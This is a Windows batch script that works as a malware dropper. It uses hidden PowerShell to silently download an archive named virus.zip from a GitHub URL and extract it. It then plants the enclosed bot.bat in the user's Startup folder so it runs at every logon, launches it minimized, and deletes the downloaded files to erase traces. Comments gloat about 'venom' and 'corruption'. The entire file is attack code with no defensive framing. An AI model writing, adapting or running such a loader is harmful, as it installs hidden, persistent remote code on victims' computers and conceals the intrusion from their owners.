@echo off
setlocal enabledelayedexpansion

:: === The raw GitHub link — ready to be devoured ===
set "url=https://raw.githubusercontent.com/banzoxOG/test/main/virus.zip"
set "zipfile=%TEMP%\payload.zip"
set "extractdir=%TEMP%\payload_extracted"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: 1. Download silently with TLS 1.2
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%url%' -OutFile '%zipfile%' -UseBasicParsing" -WindowStyle Hidden

if not exist "%zipfile%" (
    echo Download failed. Check the raw link and your network.
    exit /b 1
)

:: 2. Extract the venom
powershell -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%extractdir%' -Force" -WindowStyle Hidden

:: 3. Hunt down bot.bat recursively — no folder can hide it
set "botpath="
for /r "%extractdir%" %%f in (bot.bat) do (
    if not defined botpath set "botpath=%%f"
)

if not defined botpath (
    echo bot.bat was not found inside the archive. The payload may have a different name.
    exit /b 1
)

:: 4. Copy directly to the Startup folder
copy /y "%botpath%" "%startup%\bot.bat" >nul

:: 5. Execute it now, hidden
if exist "%startup%\bot.bat" (
    start "" /min "%startup%\bot.bat"
)

:: 6. Erase all traces of the operation
timeout /t 2 /nobreak >nul
del /f /q "%zipfile%" >nul 2>&1
rmdir /s /q "%extractdir%" >nul 2>&1

echo The corruption is planted. It will greet every new logon.
exit
